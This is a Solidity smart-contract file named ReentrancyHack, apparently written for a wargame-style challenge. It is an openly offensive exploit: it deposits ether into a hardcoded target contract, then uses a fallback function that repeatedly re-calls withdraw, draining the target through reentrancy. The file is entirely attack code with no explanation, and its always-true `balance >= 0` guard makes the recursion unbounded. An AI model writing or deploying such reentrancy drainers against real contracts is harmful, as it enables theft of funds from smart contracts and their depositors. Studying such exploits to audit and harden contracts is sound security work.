// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

interface IReentranncy{
    function withdraw(uint _ammount) external;
    function balanceOf(address _who) external;
    function donate(address _to) external payable;
}

contract ReentrancyHack {
    IReentranncy reentrancy = IReentranncy(0xa50842F731cC83202a591522139C8f7C90488ef2);
    uint public val = 0.2 ether;
   function balanceOf(address _who) public view returns (uint balance) {
        return address(this).balance;
    }
    function give() public payable returns(uint) {
        require(msg.value > 0);
        return address(this).balance;
    }
    function hack() public{
        reentrancy.donate{value:val}(address(this));
        reentrancy.withdraw(val);
    }
    fallback() external payable{
        if(address(reentrancy).balance >=0){
            reentrancy.withdraw(val);
        }
    }
} 